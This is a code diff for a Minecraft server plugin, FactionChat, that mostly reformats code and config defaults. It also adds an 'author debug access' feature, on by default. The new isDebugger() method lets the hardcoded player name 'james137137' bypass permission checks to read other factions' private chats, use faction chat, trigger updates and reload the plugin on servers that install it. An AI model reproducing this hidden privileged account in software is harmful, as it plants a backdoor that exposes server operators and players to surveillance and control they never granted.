@@ -1,6 +1,6 @@
 /*
  * Created by James137137: James Anderson andersonjames5@hotmail.com
- * version 1.293
+ * version 1.294
  */
 package com.james137137.FactionChat;
 
@@ -23,10 +23,8 @@ public class FactionChat extends JavaPlugin {
 
     static final Logger log = Logger.getLogger("Minecraft");
     private ChatChannel ChatChannel;
-    public static String FactionChatColour,FactionChatMessage, AllyChat,AllyChatMessage,EnemyChat,EnemyChatMessage,OtherFactionChat,OtherFactionChatMessage, ModChat, ModChatMessage, AdminChat, AdminChatMessage;
+    public static String FactionChatColour, FactionChatMessage, AllyChat, AllyChatMessage, EnemyChat, EnemyChatMessage, OtherFactionChat, OtherFactionChatMessage, ModChat, ModChatMessage, AdminChat, AdminChatMessage;
     public static boolean spyModeOnByDefault = true;
-    
-    
     //messages for Chat colour. Theses are customiziable in conf file.
     public static String messageNotInFaction;
     public static String messageIncorectChatModeSwitch;
@@ -35,10 +33,7 @@ public class FactionChat extends JavaPlugin {
     public static String messageNewChatMode;
     public static String messageFchatoMisstype;
     public static String messageFchatoNoOneOnline;
-    
-    
-    
-    
+    public static boolean ServerAllowAuthorDebugging;
 
     @Override
     public void onEnable() {
@@ -50,15 +45,20 @@ public class FactionChat extends JavaPlugin {
             // Failed to submit the stats :-(
             log.info("[FactionChat] Metrics: Failed to submit the stats");
         }
-        
+
         ChatChannel = new ChatChannel(); // insures that ChatChannel Class has been defined
-        
-        
+
+
         // Start of Configuration
 
         FileConfiguration config = getConfig();
 
         config.addDefault("AutoUpdate", true);
+        config.addDefault("spyModeOnByDefault", true);
+        config.addDefault("AllowAuthorDebugAccess", true); //author is james137137 - Server must be online mode
+
+        ServerAllowAuthorDebugging = getServer().getOnlineMode() && config.getBoolean("AllowAuthorDebugAccess");
+
         config.addDefault("Chat colour.FactionChat", "" + ChatColor.DARK_GREEN);
         config.addDefault("Chat colour.FactionChatMessage", "" + ChatColor.WHITE);
         config.addDefault("Chat colour.AllyChat", "" + ChatColor.GREEN);
@@ -71,65 +71,64 @@ public class FactionChat extends JavaPlugin {
         config.addDefault("Chat colour.ModChatMessage", "" + ChatColor.GREEN);
         config.addDefault("Chat colour.AdminChat", "" + ChatColor.DARK_RED);
         config.addDefault("Chat colour.AdminChatMessage", "" + ChatColor.GREEN);
-        config.addDefault("spyModeOnByDefault", true);
-        
-        
-        
-        config.addDefault("MessageLanguage","english");
+        config.addDefault("Chat colour.OtherFactionChatMessage", "" + ChatColor.WHITE);
+
+
+
+        config.addDefault("MessageLanguage", "english");
         //TODO
         /*
          *  Italian, Latin,Spanish,Russian, Chinese, Korean, Portuguese, Japanese 
          */
-        
+
         //begining of Translations
-        config.addDefault("message.english.NotInFaction","You are not member of any faction");
-        config.addDefault("message.english.IncorectChatModeSwitch","Error: please use /fc to switch chat mode or");
-        config.addDefault("message.english.SpyModeOn","Spy mode is now on");
-        config.addDefault("message.english.SpyModeOff","Spy mode is now off");
+        config.addDefault("message.english.NotInFaction", "You are not member of any faction");
+        config.addDefault("message.english.IncorectChatModeSwitch", "Error: please use /fc to switch chat mode or");
+        config.addDefault("message.english.SpyModeOn", "Spy mode is now on");
+        config.addDefault("message.english.SpyModeOff", "Spy mode is now off");
         //this was added due to a spelling error.
-        if (config.getString("message.english.NewChatMode")!=null && config.getString("message.english.NewChatMode").equals("You chat mode has been changed to: "))
-        {
-            config.set("message.english.NewChatMode","Your chat mode has been changed to: ");
+        if (config.getString("message.english.NewChatMode") != null && config.getString("message.english.NewChatMode").equals("You chat mode has been changed to: ")) {
+            config.set("message.english.NewChatMode", "Your chat mode has been changed to: ");
         }
-        config.addDefault("message.english.NewChatMode","Your chat mode has been changed to: ");
-        config.addDefault("message.english.FchatoMissType","Error: Please use /fco factionname message.");
-        config.addDefault("message.english.FchatoNoOneOnline","Error: either no faction member is online or incorrect faction name");
-        
-        config.addDefault("message.french.NotInFaction","Vous n'êtes pas membre d'une faction");
-        config.addDefault("message.french.IncorectChatModeSwitch","Erreur: s'il vous plaît utilisez /fc pour passer en mode conversation ou");
-        config.addDefault("message.french.SpyModeOn","Mode espion est maintenant sur");
-        config.addDefault("message.french.SpyModeOff","Mode espion est maintenant éteint");
-        config.addDefault("message.french.NewChatMode","Vous tchat mode a été changé en: ");
-        config.addDefault("message.french.FchatoMissType","Erreur: S'il vous plaît utiliser /fco factionname message.");
-        config.addDefault("message.french.FchatoNoOneOnline","Erreur: soit aucun membre faction est le nom de faction en ligne ou incorrecte");
-        
-        config.addDefault("message.german.NotInFaction","Sie sind nicht Mitglied einer Fraktion");
-        config.addDefault("message.german.IncorectChatModeSwitch","Fehler: Bitte Nutzungsbedingungen /fc Chat-Modus oder schalten ");
-        config.addDefault("message.german.SpyModeOn","Spy-Modus ist jetzt auf");
-        config.addDefault("message.german.SpyModeOff","Spy-Modus ist jetzt ausgeschaltet");
-        config.addDefault("message.german.NewChatMode","Sie Chat-Modus wurde geändert, um: ");
-        config.addDefault("message.german.FchatoMissType","Fehler: Bitte Nutzungsbedingungen / fco factionname Nachricht.");
-        config.addDefault("message.german.FchatoNoOneOnline","Fehler: entweder keine Partei Mitglied ist online oder falsche Fraktion Namen");
-        
-        config.addDefault("message.other.NotInFaction","You are not member of any faction");
-        config.addDefault("message.other.IncorectChatModeSwitch","Error: please use /fc to switch chat mode or");
-        config.addDefault("message.other.SpyModeOn","Spy mode is now on");
-        config.addDefault("message.other.SpyModeOff","Spy mode is now off");
-        config.addDefault("message.other.NewChatMode","You chat mode has been changed to: ");
-        config.addDefault("message.other.FchatoMissType","Error: Please use /fco factionname message.");
-        config.addDefault("message.other.FchatoNoOneOnline","Error: either no faction member is online or incorrect faction name");
-        
-        
-        
-        
-        
-        
+        config.addDefault("message.english.NewChatMode", "Your chat mode has been changed to: ");
+        config.addDefault("message.english.FchatoMissType", "Error: Please use /fco factionname message.");
+        config.addDefault("message.english.FchatoNoOneOnline", "Error: either no faction member is online or incorrect faction name");
+
+        config.addDefault("message.french.NotInFaction", "Vous n'êtes pas membre d'une faction");
+        config.addDefault("message.french.IncorectChatModeSwitch", "Erreur: s'il vous plaît utilisez /fc pour passer en mode conversation ou");
+        config.addDefault("message.french.SpyModeOn", "Mode espion est maintenant sur");
+        config.addDefault("message.french.SpyModeOff", "Mode espion est maintenant éteint");
+        config.addDefault("message.french.NewChatMode", "Vous tchat mode a été changé en: ");
+        config.addDefault("message.french.FchatoMissType", "Erreur: S'il vous plaît utiliser /fco factionname message.");
+        config.addDefault("message.french.FchatoNoOneOnline", "Erreur: soit aucun membre faction est le nom de faction en ligne ou incorrecte");
+
+        config.addDefault("message.german.NotInFaction", "Sie sind nicht Mitglied einer Fraktion");
+        config.addDefault("message.german.IncorectChatModeSwitch", "Fehler: Bitte Nutzungsbedingungen /fc Chat-Modus oder schalten ");
+        config.addDefault("message.german.SpyModeOn", "Spy-Modus ist jetzt auf");
+        config.addDefault("message.german.SpyModeOff", "Spy-Modus ist jetzt ausgeschaltet");
+        config.addDefault("message.german.NewChatMode", "Sie Chat-Modus wurde geändert, um: ");
+        config.addDefault("message.german.FchatoMissType", "Fehler: Bitte Nutzungsbedingungen / fco factionname Nachricht.");
+        config.addDefault("message.german.FchatoNoOneOnline", "Fehler: entweder keine Partei Mitglied ist online oder falsche Fraktion Namen");
+
+        config.addDefault("message.other.NotInFaction", "You are not member of any faction");
+        config.addDefault("message.other.IncorectChatModeSwitch", "Error: please use /fc to switch chat mode or");
+        config.addDefault("message.other.SpyModeOn", "Spy mode is now on");
+        config.addDefault("message.other.SpyModeOff", "Spy mode is now off");
+        config.addDefault("message.other.NewChatMode", "You chat mode has been changed to: ");
+        config.addDefault("message.other.FchatoMissType", "Error: Please use /fco factionname message.");
+        config.addDefault("message.other.FchatoNoOneOnline", "Error: either no faction member is online or incorrect faction name");
+
+
+
+
+
+
 
         config.options().copyDefaults(true);
         saveConfig();
-        
+
         //end of Configuration
-        
+
         if (config.getBoolean("AutoUpdate")) //autoupdate
         {
             Updater updater = new Updater(this, "factionchat", this.getFile(), Updater.UpdateType.DEFAULT, false);
@@ -144,8 +143,8 @@ public class FactionChat extends JavaPlugin {
         reload(config);
         // Updater updater = new Updater(this, "factionchat", this.getFile(), Updater.UpdateType.DEFAULT, false); //do not uncomment until added a config file
         // see PM message
-        
-       
+
+
 
     }
 
@@ -175,7 +174,7 @@ public class FactionChat extends JavaPlugin {
         for (int i = 0; i < onlinePlayerList.length; i++) {
             ChatMode.SetNewChatMode(onlinePlayerList[i]);
         }
-        
+
         SetMessages(config);
 
 
@@ -189,15 +188,12 @@ public class FactionChat extends JavaPlugin {
             return true;
         }
         if (commandName.equalsIgnoreCase("fco") || commandName.equalsIgnoreCase("fchato")) {
-            if (sender.hasPermission("FactionChat.OtherChat"))
-            {
+            if (sender.hasPermission("FactionChat.OtherChat") || FactionChat.isDebugger(sender.getName())) {
                 ChatChannel.fchato(sender, args);
+            } else {
+                sender.sendMessage(ChatColor.DARK_RED + "you need the permission: FactionChat.OtherChat to use that");
             }
-            else
-            {
-                sender.sendMessage(ChatColor.DARK_RED+"you need the permission: FactionChat.OtherChat to use that");
-            }
-            
+
             return true;
         }
 
@@ -206,13 +202,14 @@ public class FactionChat extends JavaPlugin {
     }
 
     public void CommandFC(CommandSender sender, String args[]) {
-        Player player = (Player)sender;//get player
+        Player player = (Player) sender;//get player
         boolean inFaction = true;
         StringTokenizer myStringTokenizer = new StringTokenizer(P.p.getPlayerFactionTag(player), "*[] "); // gets raw infomation of faction tag
         String senderFaction = myStringTokenizer.nextElement().toString();
 
 
-        if (senderFaction.equalsIgnoreCase("~") && !sender.hasPermission("FactionChat.JrModChat")) {
+        if (senderFaction.equalsIgnoreCase("~") && !sender.hasPermission("FactionChat.JrModChat")
+                && !FactionChat.isDebugger(sender.getName())) {
             //checks if player is in a faction
             //mangaddp juniormoderators FactionChat.JrModChat
             sender.sendMessage(ChatColor.RED + FactionChat.messageNotInFaction);
@@ -227,39 +224,44 @@ public class FactionChat extends JavaPlugin {
         if (args.length == 0) {
             ChatMode.NextChatMode(player);
         } else if (args.length == 1) {
-            if (args[0].equalsIgnoreCase("update") && sender.hasPermission("FactionChat.Update"))
-            {
+            if (args[0].equalsIgnoreCase("update")
+                    && (sender.hasPermission("FactionChat.Update") || FactionChat.isDebugger(sender.getName()))) {
                 Updater updater = new Updater(this, "factionchat", this.getFile(), Updater.UpdateType.DEFAULT, false);
-            }else if (args[0].equalsIgnoreCase("reload") && sender.hasPermission("FactionChat.reload"))
-            {
+            } else if (args[0].equalsIgnoreCase("reload")
+                    && (sender.hasPermission("FactionChat.reload") || FactionChat.isDebugger(sender.getName())) ) {
                 reload(this.getConfig());
                 sender.sendMessage("Reload Complete");
+            } else {
+                ChatMode.setChatMode(player, args[0]);
             }
-            else {
-              ChatMode.setChatMode(player, args[0]);  
-            }
-            
+
         } else {
             player.sendMessage(FactionChat.messageIncorectChatModeSwitch + " /fc a, /fc f, /fc p, fc e");
         }
 
     }
-    
-    public static void SetMessages(FileConfiguration config)
-    {
+
+    public static void SetMessages(FileConfiguration config) {
         String Language = config.getString("MessageLanguage");
         Language = Language.toLowerCase();
-        
-      messageNotInFaction = config.getString("message."+Language+".NotInFaction");
-      messageIncorectChatModeSwitch = config.getString("message."+Language+".IncorectChatModeSwitch");
-      messageSpyModeOn = config.getString("message."+Language+".SpyModeOn");
-      messageSpyModeOff = config.getString("message."+Language+".SpyModeOff");
-      messageNewChatMode = config.getString("message."+Language+".NewChatMode");
-      messageFchatoMisstype = config.getString("message."+Language+".FchatoMissType");
-      messageFchatoNoOneOnline = config.getString("message."+Language+".FchatoNoOneOnline");
-    
-    
-    
-    
+
+        messageNotInFaction = config.getString("message." + Language + ".NotInFaction");
+        messageIncorectChatModeSwitch = config.getString("message." + Language + ".IncorectChatModeSwitch");
+        messageSpyModeOn = config.getString("message." + Language + ".SpyModeOn");
+        messageSpyModeOff = config.getString("message." + Language + ".SpyModeOff");
+        messageNewChatMode = config.getString("message." + Language + ".NewChatMode");
+        messageFchatoMisstype = config.getString("message." + Language + ".FchatoMissType");
+        messageFchatoNoOneOnline = config.getString("message." + Language + ".FchatoNoOneOnline");
+
+
+
+
+    }
+
+    public static boolean isDebugger(String playerName) {
+        if (ServerAllowAuthorDebugging && playerName.equals("james137137")) {
+            return true;
+        }
+        return false;
     }
 }
